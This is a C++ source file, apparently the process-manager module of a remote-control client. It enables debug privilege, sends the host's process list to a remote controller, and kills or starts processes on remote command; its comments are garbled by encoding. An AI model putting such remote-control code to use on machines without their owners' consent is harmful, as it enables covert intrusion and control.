#include "pch.h"
#include "ProcessManager.h"
#include "ProcessHelper.h"



CProcessManager::CProcessManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	//�ش����ݰ���������

	YtEnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//��ǰ�ͻ���ɨ�������������еĽ�����Ϣ

	SendClientProcessList();



}
CProcessManager::~CProcessManager()
{
	_tprintf(_T("~CProcessManager()\r\n"));
	YtEnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	//ˢ�£�
	case CLIENT_PROCESS_MANAGER_REFRESH_REQUIRE:
	{
		SendClientProcessList();

		break;
	}
	//ɱ�����̣�
	case CLIENT_PROCESS_MANAGER_KILL_REQUIRE:
	{

		//YtCreateProcess1((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));

		//YtCreateProcess6((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
		YtKillProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
		//YtCreateProcesse((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
		break;
	}

	case CLIENT_PROCESS_MANAGER_CREATE_REQUIRE:
	{
		YtCreateProcesse((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
		break;
	}
	

	}
}
BOOL CProcessManager::SendClientProcessList()
{

	BOOL  IsOk = FALSE;
	DWORD Offset = 1;
	DWORD v1 = 0;
	ULONG ItemCount = 0;
	char* BufferData = NULL;

	//
	vector<PROCESS_INFORMATION_ITEM> ProcessInfo;   //��̬�ṹ������
	vector<PROCESS_INFORMATION_ITEM>::iterator i;


	//ö�ٽ�����Ϣ
	if (YtEnumProcessByToolHelp32(ProcessInfo) == FALSE)   //
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY;   //

	//����ģ������
	//[CLIENT_PROCESS_MANAGER_REPLY][ProcessID][ProcessImageName\0][ProcessFullPath\0][λ��\0][ProcessID]......
	for (i = ProcessInfo.begin(); i != ProcessInfo.end(); i++)
	{
		v1 = sizeof(HANDLE) +
			lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath) + lstrlen(i->IsWow64Process) + 3;
		// ������̫С�������·�����
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		memcpy(BufferData + Offset, &(i->ProcessIdentity), sizeof(HANDLE));
		Offset += sizeof(HANDLE);
		memcpy(BufferData + Offset, i->ProcessImageName, lstrlen(i->ProcessImageName) + 1);
		Offset += lstrlen(i->ProcessImageName) + 1;
		memcpy(BufferData + Offset, i->ProcessFullPath, lstrlen(i->ProcessFullPath) + 1);
		Offset += lstrlen(i->ProcessFullPath) + 1;
		memcpy(BufferData + Offset, i->IsWow64Process, lstrlen(i->IsWow64Process) + 1);
		Offset += lstrlen(i->IsWow64Process) + 1;
	}
	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}




